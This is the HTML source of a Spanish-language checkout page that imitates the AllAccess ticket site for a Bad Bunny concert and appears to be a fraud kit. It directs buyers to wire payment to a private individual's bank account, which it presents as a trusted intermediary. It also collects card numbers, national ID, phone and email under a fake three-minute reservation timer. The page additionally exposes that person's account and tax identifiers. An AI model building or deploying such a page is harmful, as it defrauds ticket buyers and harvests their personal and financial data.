<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllAccess - Bad Bunny - Pago con Tarjeta</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
        }

        /* NAVBAR FIJA */
        .navbar {
            background: #000;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 2000;
            box-sizing: border-box;
        }

        .navbar .logo {
            cursor: pointer;
        }

        .navbar .logo img {
            height: 25px;
        }

        .navbar-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .timer-display {
            color: white;
            font-size: 14px;
            font-weight: 600;
        }

        .menu-icon {
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        /* MEN√ö LATERAL */
        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            z-index: 2001;
        }

        .menu-overlay.active {
            display: block;
        }

        .menu-sidebar {
            position: fixed;
            top: 0;
            right: -300px;
            width: 300px;
            height: 100%;
            background: white;
            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease;
            z-index: 2002;
            overflow-y: auto;
        }

        .menu-sidebar.active {
            right: 0;
        }

        .menu-header {
            padding: 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .menu-header h3 {
            margin: 0;
            font-size: 16px;
        }

        .menu-close {
            font-size: 24px;
            cursor: pointer;
            color: #000;
            background: none;
            border: none;
        }

        .menu-items {
            padding: 20px 0;
        }

        .menu-item {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            color: #000;
            text-decoration: none;
            display: block;
            font-size: 14px;
            transition: background 0.3s;
        }

        .menu-item:hover {
            background: #f9f9f9;
            color: #7c00e2;
        }

        .content-wrapper {
            padding-top: 49px;
            padding-bottom: 100px;
            background-color: #f4f4f4;
            min-height: 100vh;
        }

        /* CONTENEDOR PRINCIPAL */
        .main-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
            color: #000;
        }

        .payment-container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .info-box {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #666;
            line-height: 1.6;
        }

        .info-box strong {
            color: #000;
        }

        .info-box.warning {
            background: #fffbf0;
            border-color: #ffe4c4;
        }

        .info-box.warning strong {
            color: #ff6b6b;
        }

        .form-section {
            margin-bottom: 25px;
        }

        .form-section h3 {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 15px;
            color: #000;
            text-transform: uppercase;
            border-bottom: 2px solid #7c00e2;
            padding-bottom: 10px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #000;
            margin-bottom: 8px;
        }

        .form-group input,
        .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            font-family: 'Inter', sans-serif;
            transition: border-color 0.3s;
        }

        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #7c00e2;
            box-shadow: 0 0 0 3px rgba(124, 0, 226, 0.1);
        }

        .form-row {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
        }

        .cbu-section {
            background: #f0f4ff;
            border: 1px solid #d0deff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }

        .cbu-label {
            font-size: 12px;
            color: #666;
            margin-bottom: 8px;
            display: block;
        }

        .cbu-value {
            font-family: 'Courier New', monospace;
            font-size: 18px;
            font-weight: 700;
            color: #7c00e2;
            display: flex;
            align-items: center;
            gap: 10px;
            word-break: break-all;
        }

        .copy-btn {
            background: #7c00e2;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            font-size: 12px;
            cursor: pointer;
            flex-shrink: 0;
        }

        .copy-btn:hover {
            background: #6a00cc;
        }

        .installment-info {
            background: #f9f7ff;
            border: 1px solid #e0d4ff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
        }

        .installment-info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #e0d4ff;
        }

        .installment-info-row:last-child {
            border-bottom: none;
        }

        .installment-info-label {
            color: #666;
            font-size: 13px;
        }

        .installment-info-value {
            font-weight: 700;
            color: #7c00e2;
            font-size: 13px;
        }

        .divider {
            border-top: 1px solid #eee;
            margin: 20px 0;
        }

        /* BARRA DE TOTAL */
        .total-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
            z-index: 1500;
        }

        .total-content {
            display: flex;
            align-items: center;
            gap: 20px;
            width: 100%;
            justify-content: space-between;
        }

        .total-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .total-label {
            color: #666;
            font-size: 14px;
        }

        .total-amount {
            font-weight: 700;
            font-size: 18px;
            color: #000;
        }

        .btn-container {
            display: flex;
            gap: 10px;
        }

        .btn-back {
            background: #ddd;
            color: #000;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        .btn-back:hover {
            background: #ccc;
        }

        .btn-finalize {
            background: #7c00e2;
            color: white;
            border: none;
            padding: 12px 50px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
        }

        .btn-finalize:hover {
            background: #6a00cc;
        }

        @media (max-width: 768px) {
            .page-title {
                font-size: 22px;
            }

            .payment-container {
                padding: 20px;
            }

            .total-bar {
                flex-direction: column;
                gap: 15px;
            }

            .total-content {
                flex-direction: column;
            }

            .btn-container {
                width: 100%;
                flex-direction: column;
            }

            .btn-back,
            .btn-finalize {
                width: 100%;
            }
        }
    </style>
</head>
<body>

    <nav class="navbar">
        <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;"><img src="images/allaccess-clear.png" alt="AllAccess"></div>
        <div class="navbar-right">
            <div class="timer-display">La reserva expira en <span id="timer">03:00</span></div>
            <div class="menu-icon" onclick="toggleMenu()" style="cursor: pointer;">‚ò∞</div>
        </div>
    </nav>

    <!-- MEN√ö LATERAL -->
    <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
    <div class="menu-sidebar" id="menuSidebar">
        <div class="menu-header">
            <h3>Men√∫</h3>
            <button class="menu-close" onclick="closeMenu()">√ó</button>
        </div>
        <div class="menu-items">
            <a href="my-entries.html" class="menu-item">Mis entradas</a>
            <a href="index.html" class="menu-item">Inicio</a>
        </div>
    </div>

    <div class="content-wrapper">
        <div class="main-container">
            <h1 class="page-title">Pago con Tarjeta de Cr√©dito/D√©bito</h1>

            <div class="payment-container">
                <div class="info-box">
                    <strong>‚úì Informaci√≥n de tu pago:</strong><br>
                    Se cobrar√° al CBU de la administradora de forma segura.
                </div>

                <!-- RESUMEN DE CUOTAS -->
                <div class="form-section">
                    <h3>üìã Resumen de tu compra</h3>
                    <div class="installment-info" id="installmentInfo">
                        <div class="installment-info-row">
                            <span class="installment-info-label">Banco:</span>
                            <span class="installment-info-value" id="bankDisplay">-</span>
                        </div>
                        <div class="installment-info-row">
                            <span class="installment-info-label">Cuotas:</span>
                            <span class="installment-info-value" id="installmentsDisplay">-</span>
                        </div>
                        <div class="installment-info-row">
                            <span class="installment-info-label">Valor por cuota:</span>
                            <span class="installment-info-value" id="installmentAmountDisplay">-</span>
                        </div>
                        <div class="installment-info-row" style="border-top: 1px solid #e0d4ff; margin-top: 8px; padding-top: 12px;">
                            <span class="installment-info-label" style="font-weight: 700;">Total a pagar:</span>
                            <span class="installment-info-value" style="font-size: 15px;" id="totalDisplay">-</span>
                        </div>
                    </div>
                </div>

                <!-- CBU ADMINISTRADORA -->
                <div class="form-section">
                    <h3>üè¶ CBU para abono</h3>
                    <div class="cbu-section">
                        <span class="cbu-label">CBU para intermediaria:</span>
                        <div class="cbu-value">
                            0000168300000021716126
                            <button class="copy-btn" onclick="copyCBU()">Copiar</button>
                        </div>
                        <div style="margin-top: 12px; padding-top: 12px; border-top: 1px solid #d0deff; font-size: 13px; color: #666;">
                            <strong>Titular:</strong> Maria Alejandra Picallo<br>
                            <strong>CUIL:</strong> 27243581813
                        </div>
                    </div>
                    
                    <div class="info-box" style="margin-top: 15px;">
                        <strong>üí° ¬øPor qu√© transferir a una intermediaria?</strong><br>
                        Maria Alejandra Picallo es una intermediaria confiable que se toma el tiempo de validar que no haya estafas. 
                        Ella verifica cada comprobante de pago antes de confirmar tus entradas, protegiendo tanto a compradores como a vendedores. 
                        Este proceso adicional nos permite garantizar transacciones seguras.
                    </div>
                </div>

                <!-- DATOS DE TARJETA -->
                <div class="form-section">
                    <h3>üí≥ Datos de tu tarjeta</h3>
                    
                    <div class="form-group">
                        <label for="cardholderName">Nombre del titular *</label>
                        <input type="text" id="cardholderName" placeholder="Ej: Juan P√©rez" required>
                    </div>

                    <div class="form-group">
                        <label for="cardNumber">N√∫mero de tarjeta *</label>
                        <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    </div>

                    <div class="form-group">
                        <label for="documentNumber">DNI/Documento *</label>
                        <input type="text" id="documentNumber" placeholder="Ej: 12345678" required>
                    </div>

                    <div class="form-group">
                        <label for="phoneNumber">N√∫mero de tel√©fono *</label>
                        <input type="tel" id="phoneNumber" placeholder="Ej: 1123456789" required>
                    </div>

                    <div class="form-group">
                        <label for="emailAddress">Gmail *</label>
                        <input type="email" id="emailAddress" placeholder="tu@gmail.com" required>
                    </div>
                </div>

                <div class="divider"></div>

                <div class="info-box warning">
                    <strong>‚ö†Ô∏è Importante:</strong><br>
                    El pago se procesar√° hacia el CBU de la administradora. Aseg√∫rate de que todos los datos sean correctos antes de continuar.
                </div>
            </div>
        </div>
    </div>

    <div class="total-bar">
        <div class="total-content">
            <div class="total-info">
                <span class="total-label">Total a pagar:</span>
                <span class="total-amount" id="totalAmount">$ 425.500,00</span>
            </div>
            <div class="btn-container">
                <button class="btn-back" onclick="goBack()">Volver</button>
                <button class="btn-finalize" onclick="finalizePay()">Procesar Pago</button>
            </div>
        </div>
    </div>

    <script>
        function toggleMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.toggle('active');
            sidebar.classList.toggle('active');
        }

        function closeMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.remove('active');
            sidebar.classList.remove('active');
        }

        // Cerrar men√∫ al hacer click en un enlace
        document.querySelectorAll('.menu-item').forEach(item => {
            item.addEventListener('click', closeMenu);
        });

        // Obtener datos de la sesi√≥n
        let selectedQuantity = parseInt(sessionStorage.getItem('selectedQuantity')) || 1;
        let basePrice = parseFloat(sessionStorage.getItem('basePrice')) || 350000;
        let selectedBank = sessionStorage.getItem('selectedBank') || '-';
        let selectedInstallments = parseInt(sessionStorage.getItem('selectedInstallments')) || 1;

        // Inicializar p√°gina
        document.addEventListener('DOMContentLoaded', function() {
            displayInstallmentInfo();
            startTimer();
        });

        function displayInstallmentInfo() {
            const subtotal = basePrice * selectedQuantity;
            const serviceFee = 55500;
            const total = subtotal + serviceFee;
            const installmentAmount = total / selectedInstallments;

            const bankNames = {
                'dni': 'DNI',
                'bnaplus': 'BNA+',
                'bbva': 'BBVA',
                'galicia': 'Galicia',
                'santander': 'Santander'
            };

            document.getElementById('bankDisplay').textContent = bankNames[selectedBank] || '-';
            document.getElementById('installmentsDisplay').textContent = selectedInstallments + ' cuota' + (selectedInstallments > 1 ? 's' : '');
            document.getElementById('installmentAmountDisplay').textContent = '$ ' + installmentAmount.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            document.getElementById('totalDisplay').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            document.getElementById('totalAmount').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }

        function startTimer() {
            let minutes = 3;
            let seconds = 0;

            // Mostrar tiempo inicial
            document.getElementById('timer').textContent = '03:00';

            const interval = setInterval(() => {
                if (minutes === 0 && seconds === 0) {
                    clearInterval(interval);
                    document.getElementById('timer').textContent = '00:00';
                    alert('La reserva ha expirado');
                    return;
                }

                if (seconds === 0) {
                    minutes--;
                    seconds = 59;
                } else {
                    seconds--;
                }

                document.getElementById('timer').textContent = 
                    String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
            }, 1000);
        }

        function copyCBU() {
            const cbu = '0000168300000021716126';
            navigator.clipboard.writeText(cbu).then(() => {
                alert('CBU copiado al portapapeles');
            }).catch(err => {
                console.error('Error al copiar:', err);
            });
        }

        // Formatear n√∫mero de tarjeta
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '');
            let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = formattedValue;
        });

        function goBack() {
            window.history.back();
        }

        function finalizePay() {
            // Validar campos
            const cardholderName = document.getElementById('cardholderName').value.trim();
            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const documentNumber = document.getElementById('documentNumber').value.trim();
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            const emailAddress = document.getElementById('emailAddress').value.trim();

            if (!cardholderName) {
                alert('Por favor ingresa el nombre del titular');
                return;
            }

            if (cardNumber.length !== 16) {
                alert('El n√∫mero de tarjeta debe tener 16 d√≠gitos');
                return;
            }

            if (!documentNumber) {
                alert('Por favor ingresa tu DNI/Documento');
                return;
            }

            if (!phoneNumber) {
                alert('Por favor ingresa tu n√∫mero de tel√©fono');
                return;
            }

            if (!emailAddress || !emailAddress.includes('@')) {
                alert('Por favor ingresa un correo electr√≥nico v√°lido');
                return;
            }

            // Guardar datos de tarjeta en localStorage
            const cardData = {
                cardholderName: cardholderName,
                cardNumber: '**** **** **** ' + cardNumber.slice(-4),
                documentNumber: documentNumber,
                phoneNumber: phoneNumber,
                emailAddress: emailAddress
            };
            localStorage.setItem('cardData', JSON.stringify(cardData));

            // Redirigir a la pantalla de CBU
            window.location.href = 'card-payment-cbu.html';
        }
    </script>
</body>
</html>
